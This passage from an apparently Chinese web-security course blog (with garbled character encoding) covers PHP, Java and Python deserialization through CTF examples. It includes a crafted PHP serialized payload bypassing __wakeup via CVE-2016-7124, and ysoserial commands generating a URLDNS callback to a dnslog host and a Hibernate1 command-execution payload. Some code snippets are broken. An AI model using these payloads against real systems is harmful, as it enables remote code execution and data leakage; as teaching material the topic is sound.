class="number">00</span>Name%<span class="number">00</span>username<span class="string">&quot;%3Bs</span></span><br><span class="line"><span class="string">%3A5%3A&quot;</span>admin<span class="string">&quot;%3Bs%3A14%3A%00Name%00password&quot;</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"></span><br><span class="line">æ€è·¯ï¼šé€šè¿‡æ–‡ä»¶ç›®å½•æ‰«æå‡ºwww.zipæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­å«æœ‰ç½‘ç«™æºä»£ç ï¼Œè§‚å¯Ÿç½‘ç«™æºç å‘ç°è¦æƒ³è·å¾—flagéœ€è¦</span><br><span class="line">password=<span class="number">100</span>&amp;username=adminï¼ŒåŒæ—¶å¹¶æœªç»™å‡ºä¼ å‚çš„ä½ç½®ï¼Œ</span><br><span class="line">æ‰€ä»¥éœ€è¦åˆ©ç”¨ååºåˆ—åŒ–æ„é€ usernameå’Œpasswordï¼Œ</span><br><span class="line">ä½†æ˜¯åœ¨åˆ©ç”¨<span class="title function_ invoke__">unserialize</span>()å‡½æ•°çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨<span class="title function_ invoke__">__wakeup</span>()é­”æœ¯æ–¹é¢æŠŠusernameä¿®æ”¹ï¼Œ</span><br><span class="line">æ‰€ä»¥æ€è€ƒè¦è·³è¿‡<span class="title function_ invoke__">__wakeiup</span>()é­”æœ¯æ–¹æ³•ï¼Œå°±éœ€è¦åˆ©ç”¨CVE-<span class="number">2016</span>-<span class="number">7124</span>æ¼æ´ã€‚</span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šPHP5 &lt; <span class="number">5.6</span>.<span class="number">25</span>ï¼›PHP7 &lt; <span class="number">7.0</span>.<span class="number">10</span></span><br><span class="line">æ¼æ´åŸå› ï¼šå¦‚æœå­˜åœ¨__wakeupæ–¹æ³•ï¼Œè°ƒç”¨ <span class="title function_ invoke__">unserilize</span>() æ–¹æ³•å‰åˆ™å…ˆè°ƒç”¨__wakeupæ–¹æ³•ï¼Œ</span><br><span class="line">ä½†æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</span><br><span class="line">æ„é€ é“¾ï¼š</span><br><span class="line">&lt;?php</span><br><span class="line">	<span class="keyword">class</span> Name&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¾“å‡ºç»“æœåä¿®æ”¹å±æ€§ä¸ªæ•°å¤§äºçœŸå®å±æ€§ä¸ªæ•°å³å¯ï¼Œç„¶åä¼ å‚å¸¦å…¥å³å¯ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="CTF-æ–¹æ³•åŸç”Ÿç±»è·å–-åˆ©ç”¨-é…åˆå…¶ä»–"><a href="#CTF-æ–¹æ³•åŸç”Ÿç±»è·å–-åˆ©ç”¨-é…åˆå…¶ä»–" class="headerlink" title="CTF-æ–¹æ³•åŸç”Ÿç±»è·å–&amp;åˆ©ç”¨&amp;é…åˆå…¶ä»–"></a>CTF-æ–¹æ³•åŸç”Ÿç±»è·å–&amp;åˆ©ç”¨&amp;é…åˆå…¶ä»–</h4><h5 id="æ­¤å¤„å›é¡¾äº†ctfshow-259å…³"><a href="#æ­¤å¤„å›é¡¾äº†ctfshow-259å…³" class="headerlink" title="æ­¤å¤„å›é¡¾äº†ctfshow 259å…³"></a>æ­¤å¤„å›é¡¾äº†ctfshow 259å…³</h5><p>å¯¹äºè¿™ä¸ªåŸç”Ÿç±»çš„çŸ¥è¯†ï¼Œä¸»è¦æ˜¯ä»ä¸€ä¸‹ä¸‰ä¸ªæ–¹é¢å»è¯´æ˜ã€‚<br>-PHPæœ‰é‚£äº›åŸç”Ÿç±»-è§è„šæœ¬ä½¿ç”¨<br>-å¸¸è§ä½¿ç”¨çš„åŸç”Ÿç±»-è§å‚è€ƒæ¡ˆä¾‹<br>-åŸç”Ÿç±»è¯¥æ€ä¹ˆä½¿ç”¨-è§å®˜æ–¹è¯´æ˜<br>é¦–å…ˆé€šè¿‡ç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªå°è„šæœ¬ï¼Œå¯ä»¥åˆ—å‡ºæ¯ä¸ªé­”æœ¯æ–¹æ³•å¯¹åº”çš„ä¸€äº›åŸç”Ÿç±»ã€‚<br>ç›´æ¥è®¿é—®å³å¯è¿”å›åŸç”Ÿç±»ï¼ˆä½†ä¸å…¨ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line"><span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line"></span><br><span class="line">))) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;&#125;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>æœ¬åœ°dome xss</strong></p>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a><br>æ€è·¯ï¼šé€šè¿‡åˆ†æä»£ç ä¼ å…¥å‚æ•°kï¼Œæœ€åç›´æ¥è¾“å‡ºå¯¹è±¡ï¼Œæ­¤å¤„å¯ä»¥ä½¿ç”¨__tostringé­”æœ¯æ–¹æ³•ï¼Œä½†æ˜¯ä»£ç ä¸­å¹¶æ²¡åŒ…å«__tostringçš„å¯¹è±¡ï¼Œæ‰€ä»¥æƒ³åˆ°è¦ä½¿ç”¨åŸç”Ÿç±»</p>
<h6 id="å›é¡¾ctfshow259-åˆ©ç”¨åŸç”Ÿç±»"><a href="#å›é¡¾ctfshow259-åˆ©ç”¨åŸç”Ÿç±»" class="headerlink" title="å›é¡¾ctfshow259 åˆ©ç”¨åŸç”Ÿç±»"></a><strong>å›é¡¾ctfshow259 åˆ©ç”¨åŸç”Ÿç±»</strong></h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ€è·¯ï¼šåˆ†æä»£ç å­˜åœ¨ä¸å­˜åœ¨çš„å‡½æ•°æ–¹æ³•æ‰€ä»¥iæƒ³åˆ°åˆ©ç”¨<span class="title function_ invoke__">__call</span>()é­”æœ¯æ–¹æ³•è§¦å‘ï¼Œ</span><br><span class="line">ä½†æ˜¯ä»£ç ä¸­æ²¡æœ‰<span class="title function_ invoke__">__call</span>()é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥æƒ³åˆ°ä½¿ç”¨å«æœ‰é­”æœ¯æ–¹æ³•çš„åŸç”Ÿç±»<span class="title function_ invoke__">soapClient</span>()è®¿é—®flag.phpè®²flagå†™å…¥flag.txtï¼Œæœ€åè¯»å–å³å¯ã€‚</span><br><span class="line">flag.phpä¸­è¡¨æ˜éœ€è¦æœ¬åœ°è®¿é—®ä¸”uaå¤´æœ‰é™åˆ¶token=ctfshowæ–¹å¯å†™å…¥ã€‚</span><br></pre></td></tr></table></figure>

<p>å°†æ„é€ çš„å¥½çš„é“¾é€šè¿‡å‚æ•°ä¼ å…¥å³å¯å°†falgå†™å…¥flag.txtï¼Œæœ€åè¯»å–flag.txt</p>
<h1 id="ç¬¬47å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-Javaååºåˆ—åŒ–-EXPç”Ÿæˆ-æ•°æ®æå–-ç»„ä»¶å®‰å…¨"><a href="#ç¬¬47å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-Javaååºåˆ—åŒ–-EXPç”Ÿæˆ-æ•°æ®æå–-ç»„ä»¶å®‰å…¨" class="headerlink" title="ç¬¬47å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;Javaååºåˆ—åŒ–&amp;EXPç”Ÿæˆ&amp;æ•°æ®æå–&amp;ç»„ä»¶å®‰å…¨"></a>ç¬¬47å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;Javaååºåˆ—åŒ–&amp;EXPç”Ÿæˆ&amp;æ•°æ®æå–&amp;ç»„ä»¶å®‰å…¨</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-27"><a href="#çŸ¥è¯†ç‚¹ï¼š-27" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€Javaååºåˆ—åŒ–æ¼”ç¤º-åŸç”ŸAPIæ¥â˜<br>2ã€Javaååºåˆ—åŒ–æ¼æ´åˆ©ç”¨-Ysoserialä½¿ç”¨<br>3ã€Javaååºåˆ—åŒ–æ¼æ´å‘ç°åˆ©ç”¨ç‚¹-å‡½æ•°&amp;æ•°æ®<br>4ã€Javaååºåˆ—åŒ–è€ƒç‚¹-çœŸå®&amp;CTFèµ›é¢˜-å®¡è®¡åˆ†æ</p>
<h4 id="å†…å®¹ç‚¹ï¼š"><a href="#å†…å®¹ç‚¹ï¼š" class="headerlink" title="#å†…å®¹ç‚¹ï¼š"></a>#å†…å®¹ç‚¹ï¼š</h4><p>1ã€æ˜ç™½Javaååºåˆ—åŒ–åŸç†<br>2ã€åˆ¤æ–­Javaååºåˆ—åŒ–æ¼æ´<br>3ã€å­¦ä¼š-Ysoserial_å·¥å…·ä½¿ç”¨<br>4ã€å­¦ä¼š-SerializationDumper<br>5ã€äº†è§£-ç®€è¦Javaä»£ç å®¡è®¡åˆ†æ</p>
<h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="#å‰ç½®çŸ¥è¯†"></a>#å‰ç½®çŸ¥è¯†</h4><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ¦‚å¿µï¼š<br>åºåˆ—åŒ–ï¼šæŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ã€‚<br>ååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚<br>å¯¹è±¡çš„åºåˆ—åŒ–ä¸»è¦æœ‰ä¸¤ç§ç”¨é€”ï¼š<br>æŠŠå¯¹è±¡çš„å­—èŠ‚åºåˆ—æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼Œé€šå¸¸å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼›ï¼ˆæŒä¹…åŒ–å¯¹è±¡ï¼‰<br>åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚ï¼ˆç½‘ç»œä¼ è¾“å¯¹è±¡ï¼‰</p>
<blockquote>
<p>å°½ç®¡ Java ååºåˆ—åŒ–å’Œ PHP ååºåˆ—åŒ–åœ¨å¤„ç†å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½å­˜åœ¨ç±»ä¼¼çš„å®‰å…¨é—®é¢˜ï¼Œä½†å®ƒä»¬ä¹‹é—´è¿˜æ˜¯æœ‰ä¸€äº›ä¸åŒçš„åœ°æ–¹ï¼š<br>åºåˆ—åŒ–æ ¼å¼ä¸åŒï¼šJava ä½¿ç”¨äº†è‡ªå·±çš„åºåˆ—åŒ–æœºåˆ¶æ¥æ”¯æŒå¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œè€Œ PHP é€šå¸¸ä½¿ç”¨åŸºäºæ–‡æœ¬çš„åºåˆ—åŒ–æ ¼å¼ï¼ˆå¦‚<br>serialize å’Œ unserialize å‡½æ•°ï¼‰è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ åºåˆ—åŒ–å™¨å®ç°æ–¹å¼ä¸åŒï¼šJava åºåˆ—åŒ–å™¨å®ç°äº†<br>Serializable æ¥å£ï¼Œå¹¶é€šè¿‡åå°„æœºåˆ¶è·å–å¯¹è±¡çš„å±æ€§å€¼è¿›è¡Œåºåˆ—åŒ–ã€‚è€Œ PHP åºåˆ—åŒ–å™¨æ²¡æœ‰ç»Ÿä¸€çš„æ¥å£ï¼Œè€Œæ˜¯é€šè¿‡é­”æœ¯æ–¹æ³•ï¼ˆå¦‚<br>__sleep() å’Œ __wakeup()ï¼‰å’Œè‡ªå®šä¹‰å‡½æ•°è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ å¯¹è±¡ç±»å‹çš„æ£€æŸ¥æ–¹å¼ä¸åŒï¼šJava ååºåˆ—åŒ–å°†å¯¹ååºåˆ—åŒ–çš„å¯¹è±¡è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œå¹¶ä¸”åªä¼šååºåˆ—åŒ–å·²çŸ¥ç±»å‹çš„å¯¹è±¡ã€‚<br>PHPçš„ååºåˆ—åŒ–å™¨åˆ™æ²¡æœ‰è¿™æ ·çš„é™åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ åºåˆ—åŒ–æ•°æ®æ¥æ¬ºéª—ååºåˆ—åŒ–å™¨ã€‚ å¯é‡å†™æ–¹æ³•çš„è§¦å‘æ–¹å¼ä¸åŒï¼šJava ååºåˆ—åŒ–å™¨é€šè¿‡ç‰¹å®šçš„æ–¹æ³•ï¼ˆä¾‹å¦‚readObject()ï¼‰æ¥è§¦å‘å¯é‡å†™æ–¹æ³•ï¼Œè€Œ PHP ååºåˆ—åŒ–å™¨éœ€è¦åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­åŒ…å« O:classname: æ ¼å¼çš„å…ƒä¿¡æ¯æ¥å®ç°ã€‚<br>ç»¼ä¸Šæ‰€è¿°ï¼Œè™½ç„¶ Java ååºåˆ—åŒ–å’Œ PHP ååºåˆ—åŒ–å­˜åœ¨ä¸€äº›ä¸åŒï¼Œä½†å®ƒä»¬éƒ½å¿…é¡»å°å¿ƒå¤„ç†ååºåˆ—åŒ–çš„è¾“å…¥æ•°æ®ï¼Œä»¥é¿å…å¯¼è‡´å®‰å…¨æ¼æ´ã€‚å‡½æ•°æ¥å£ï¼š</p>
</blockquote>
<h4 id="å‡½æ•°æ¥å£ï¼š"><a href="#å‡½æ•°æ¥å£ï¼š" class="headerlink" title="å‡½æ•°æ¥å£ï¼š"></a>å‡½æ•°æ¥å£ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java:Serializable Extemalizableæ¥â˜ã€fastjsonã€jacksonã€gsonã€</span><br><span class="line">ObjectInputStream.read,ObjectobjectInputStream.readUnshared,XMLDecoder.read.</span><br><span class="line">ObjectYaml.loadXStream.fromXML.ObjectMapper.readValue.JSON.parseObject</span><br><span class="line">PHP:serialize(ï¼‰unserialize(ï¼‰</span><br><span class="line">Python:pickle</span><br></pre></td></tr></table></figure>

<h4 id="æ•°æ®å‡ºç°ï¼š"><a href="#æ•°æ®å‡ºç°ï¼š" class="headerlink" title="æ•°æ®å‡ºç°ï¼š"></a>æ•°æ®å‡ºç°ï¼š</h4><p>1ã€åŠŸèƒ½ç‰¹æ€§ï¼š<br>ååºåˆ—åŒ–æ“ä½œä¸€èˆ¬åº”ç”¨åœ¨å¯¼å…¥æ¨¡æ¿æ–‡ä»¶ã€ç½‘ä¾‹ç»œé€šä¿¡ã€æ•°æ®ä¼ è¾“ã€æ—¥å¿—æ ¼å¼åŒ–å­˜å‚¨ã€å¯¹è±¡æ•°<br>æ®è½ç£ç›˜ã€æˆ–DBå­˜å‚¨ç­‰ä¸šåŠ¡åœºæ™¯ã€‚å› æ­¤å®¡è®¡è¿‡ç¨‹ä¸­é‡ç‚¹å…³æ³¨è¿™äº›åŠŸèƒ½æ¿å—ã€‚<br>2ã€æ•°æ®ç‰¹æ€§ï¼š<br>ä¸€æ®µæ•°æ®ä»¥rO0ABå¼€å¤´ï¼Œä½ åŸºæœ¬å¯ä»¥ç¡®å®šè¿™ä¸²å°±æ˜¯JAVAåºåˆ—åŒ–base64åŠ å¯†çš„æ•°æ®ã€‚<br>æˆ–è€…å¦‚æœä»¥acedå¼€å¤´ï¼Œé‚£ä¹ˆä»–å°±æ˜¯è¿™ä¸€æ®µjavaåºåˆ—åŒ–çš„16è¿›åˆ¶ã€‚<br>3ã€å‡ºç°å…·ä½“ï¼š<br>httpå‚æ•°ï¼Œcookie,sesion,å­˜å‚¨æ–¹å¼å¯èƒ½æ˜¯base64(rO0)ï¼Œå‹ç¼©åçš„base64(H4s),Mllç­‰<br>Servlets http,Sockets,Sessionç®¡ç†å™¨ï¼ŒåŒ…å«çš„åè®®å°±åŒ…æ‹¬ï¼šJMX,RMl,JMS,JND1ç­‰<br>(\xac\Xed)xm IXstream,XmldEcoder (http Body:Content-type:application&#x2F;xml)<br>json0 ackson,fastison)httpè¯·æ±‚ä¸­åŒ…å«</p>
<h4 id="å‘ç°ï¼š"><a href="#å‘ç°ï¼š" class="headerlink" title="å‘ç°ï¼š"></a>å‘ç°ï¼š</h4><p>é»‘ç›’åˆ†æï¼šæ•°æ®åº“å‡ºç°åœ°-è§‚å¯Ÿæ•°æ®ç‰¹æ€§<br>ç™½ç›’åˆ†æï¼šç»„ä»¶å®‰å…¨&amp;æ•°æœç´¢&amp;åŠŸèƒ½æ¨¡å—<br>åˆ©ç”¨ï¼š<br>Ysoserialsé›†æˆçš„jaråŒ…é…åˆç”Ÿæˆï¼Œç‰¹æ€§çš„ä¸“ä¸šæ¼æ´åˆ©ç”¨å·¥å…·ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-24"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-24" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>åŸç”ŸAPI -Ysoserial URLDNSä½¿ç”¨<br>ä¸‰æ–¹ç»„ä»¶-Ysoserialæ”¯æŒåº“ç”Ÿæˆä½¿ç”¨<br>è§£å¯†åˆ†æ-SerializationDumperæ•°æ®åˆ†æ<br>CTFèµ›é¢˜-[ç½‘é¼æ¯2020æœ±é›€ç»„]ThinkJava</p>
<h4 id="åŸç”ŸAPI-Ysoserial-URLDNSä½¿ç”¨"><a href="#åŸç”ŸAPI-Ysoserial-URLDNSä½¿ç”¨" class="headerlink" title="#åŸç”ŸAPI-Ysoserial URLDNSä½¿ç”¨"></a>#åŸç”ŸAPI-Ysoserial URLDNSä½¿ç”¨</h4><p>Serializableæ¥å£<br>Externalizableæ¥å£<br>æ²¡ç»„ä»¶ç”ŸæˆDNSåˆ©ç”¨ï¼š<br><a href="https://github/com/frohoff">https://github/com/frohoff</a> ysoserial<br>java -jar ysoserial-0.0.6-SNAPSHOT-all jar URLDNS <a href="http://9ar7xl/">http://9ar7xl</a> anslog.cnâ€&gt;urldns.ser<br>æ€è·¯ï¼šæœ¬åœ°æ­å»ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œï¼Œä½¿ç”¨ysoserial ç”Ÿæˆååºåˆ—åŒ–è¯­å¥ç”¨æ¥è®¿é—®dnslogå¹¶ä¿å­˜åˆ°æœ¬åœ°ï¼Œå½“ååºåˆ—åŒ–æ‰§è¡Œçš„å¯¹è±¡ä¸ºæ„é€ å¥½çš„æœ¬åœ°æ–‡ä»¶æ—¶ï¼Œè§¦å‘è®¿é—®dnslogï¼Œé€ æˆä¿¡æ¯å¤–å¸¦ã€‚</p>
<h4 id="ä¸‰æ–¹ç»„ä»¶-Ysoserialæ”¯æŒåº“ç”Ÿæˆä¾¿ç”¨"><a href="#ä¸‰æ–¹ç»„ä»¶-Ysoserialæ”¯æŒåº“ç”Ÿæˆä¾¿ç”¨" class="headerlink" title="#ä¸‰æ–¹ç»„ä»¶-Ysoserialæ”¯æŒåº“ç”Ÿæˆä¾¿ç”¨"></a>#ä¸‰æ–¹ç»„ä»¶-Ysoserialæ”¯æŒåº“ç”Ÿæˆä¾¿ç”¨</h4><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br>æ­¤å¤„è®²è§£äº†wegooaté¶åœºä¸­Javaååºåˆ—åŒ–å…³å¡ï¼Œé¦–å…ˆé€šè¿‡æŠ“åŒ…æ‰¾åˆ°å«æœ‰ååºåˆ—åŒ–å‡½æ•°å¤„ï¼Œç„¶åæœ‰ä¸¤ç§ï¼Œç¬¬ä¸€ç§ç»“åˆåŸç”Ÿç±»ï¼ˆæ¯”å¦‚ URLDNSï¼‰ç”Ÿæˆpayloadï¼Œç¬¬äºŒç§ç»“åˆåŸç”Ÿç±»hibernateç”Ÿæˆpayloadï¼ˆç»“åˆåº“æ–‡ä»¶ç”Ÿæˆçš„ä¸€èˆ¬å¯ä»¥æ‰§è¡Œrceï¼‰</p>
<p>å…ˆç»“åˆåº“æ–‡ä»¶åˆ©ç”¨jaråŒ…ç”Ÿæˆç‰¹å®špayloadï¼Œæ­¤å¤„æ˜¯åˆ©ç”¨hibemnateç”Ÿæˆäº†å¼¹å‡ºè®¡ç®—å™¨çš„payloadå¹¶ä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åå°†payloadè¿›è¡Œbase64åŠ å¯†ã€‚</p>
<p>æœ‰ç»„ä»¶ç”ŸæˆRCE1ã€ç”Ÿæˆï¼šjava-Dhibernate5 cp hibemnate-core-5.4.9 Final jar ysoserial-0.0.6-<br>SNAPSHOT-all jar ysoseral.GeneratePayload Hibernate1 â€œcalc.exeâ€&gt;x bin<br>2ã€è§£ç ï¼špython java.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file <span class="built_in">open</span>(â€œx <span class="built_in">bin</span>â€â€œrbâ€)</span><br><span class="line">now flle readï¼ˆï¼‰</span><br><span class="line">ba base64 D64encode(now)</span><br><span class="line"><span class="built_in">print</span> ba</span><br><span class="line">file close</span><br></pre></td></tr></table></figure>

<p>3ã€CTFèµ›é¢˜â€”[ç½‘é¼æ¯2020æœ±é›€ç»„]ThinkJava</p>
<p><a href="https://www.cnblogs.com/h3zh1/p/12914439.html">https://www.cnblogs.com/h3zh1/p/12914439.html</a></p>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/RABCDXB/article/details/124003575">https://blog.csdn.net/RABCDXB/article/details/124003575</a></p>
<h1 id="ç¬¬48å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-Pyååºåˆ—åŒ–-é“¾æ„é€ -è‡ªåŠ¨å®¡è®¡bandit-é­”æœ¯æ–¹æ³•"><a href="#ç¬¬48å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-Pyååºåˆ—åŒ–-é“¾æ„é€ -è‡ªåŠ¨å®¡è®¡bandit-é­”æœ¯æ–¹æ³•" class="headerlink" title="ç¬¬48å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;Pyååºåˆ—åŒ–&amp;é“¾æ„é€ &amp;è‡ªåŠ¨å®¡è®¡bandit&amp;é­”æœ¯æ–¹æ³•"></a>ç¬¬48å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;Pyååºåˆ—åŒ–&amp;é“¾æ„é€ &amp;è‡ªåŠ¨å®¡è®¡bandit&amp;é­”æœ¯æ–¹æ³•</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-28"><a href="#çŸ¥è¯†ç‚¹ï¼š-28" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€Python-ååºåˆ—åŒ–å‡½æ•°ä½¿ç”¨<br>2ã€Python-ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•<br>3ã€Python-ååºåˆ—åŒ–POPé“¾æ„é€ <br>4ã€Python-è‡ªåŠ¨åŒ–å®¡è®¡banditä½¿ç”¨</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-1"><a href="#å‰ç½®çŸ¥è¯†ï¼š-1" class="headerlink" title="#å‰ç½®çŸ¥è¯†ï¼š"></a>#å‰ç½®çŸ¥è¯†ï¼š</h4><p>å‡½æ•°ä½¿ç”¨ï¼š<br>pickle.dump(obj,file):å°†å¯¹è±¡åºåˆ—åŒ–åä¿å­˜åˆ°æ–‡ä»¶<br>pickle.load(le):è¯»å–æ–‡ä»¶ï¼Œå°†æ–‡ä»¶ä¸­çš„åºåˆ—åŒ–å†…å®¹ååºåˆ—åŒ–ä¸ºå¯¹è±¡<br>pickle.dumps(obj):å°†å¯¹è±¡åºåˆ—åŒ–æˆå­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµ<br>pickle.loads(bytes obj):å°†å­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµååºåˆ—åŒ–ä¸ºå¯¹è±¡<br>é­”æœ¯æ–¹æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__reduce (__()      ååºåˆ—åŒ–æ—¶è°ƒç”¨</span><br><span class="line">__reduce__ex__()    ååºåˆ—åŒ–æ—¶è°ƒç”¨</span><br><span class="line">__setstate__()      ååºåˆ—åŒ–æ—¶è°ƒç”¨</span><br><span class="line">__getstate__()    åºåˆ—åŒ–æ—¶è°ƒç”¨</span><br></pre></td></tr></table></figure>

<p>å„ç±»è¯­è¨€å‡½æ•°ï¼š<br>Java:Serializable Extemalizableæ¥â˜ã€fastisonã€jacksonã€gsonã€<br>ObjectInputStream.read,ObjectobjectInputStream.readUnshared,XMLDecoder.read.<br>ObjectYaml loadXStream.fromXML ObjectMapper.readValue.JSON.parseObject<br>PHP:serializeï¼ˆï¼‰.unserializeï¼ˆï¼‰<br>Python:pickle marshal PyYAML shelve PIL unzip</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-25"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-25" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>åŸç†-ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•-è°ƒç”¨ç†è§£<br>CTF-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨-æ„é€ &amp;RCE<br>CTF-CISCN2019ååŒ—-JWT&amp;ååºåˆ—åŒ–<br>ä»£ç å®¡è®¡-è‡ªåŠ¨åŒ–å·¥å…·-bandit?å®‰è£…åŠä½¿ç”¨</p>
<h4 id="åŸç†ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨ç†è§£"><a href="#åŸç†ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨ç†è§£" class="headerlink" title="#åŸç†ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨ç†è§£"></a>#åŸç†ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨ç†è§£</h4><p>é­”æœ¯æ–¹æ³•åˆ©ç”¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reduce() ååºåˆ—åŒ–æ—¶è°ƒç”¨</span><br><span class="line">reduce_ex() ååºåˆ—åŒ–æ—¶è°ƒç”¨</span><br><span class="line">setstate() ååºåˆ—åŒ–æ—¶è°ƒç”¨</span><br><span class="line">getstate() åºåˆ—åŒ–æ—¶è°ƒç”¨</span><br></pre></td></tr></table></figure>

